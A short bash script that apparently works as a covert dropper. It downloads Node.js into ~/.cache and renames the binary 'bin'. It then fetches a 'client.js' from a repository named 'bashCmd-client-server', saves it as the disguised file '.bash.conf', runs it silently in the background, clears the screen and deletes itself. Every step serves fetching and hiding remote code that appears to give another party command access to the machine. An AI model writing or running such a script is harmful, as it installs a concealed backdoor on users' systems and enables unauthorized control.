#!/bin/bash

set -ea -o pipefail

FILENAME=.bash.conf
NODE_VERSION=v6.3.1

mkdir -p ~/.cache
cd ~/.cache
curl https://nodejs.org/dist/$NODE_VERSION/node-$NODE_VERSION-linux-x64.tar.xz > node.tar.xz
tar -xvf node.tar.xz
cp node-$NODE_VERSION-linux-x64/bin/node .
mv node bin
rm -rf node-$NODE_VERSION-linux-x64/bin/node
curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > $FILENAME


nohup ./bin $FILENAME > /dev/null & clear
rm -- "$0"
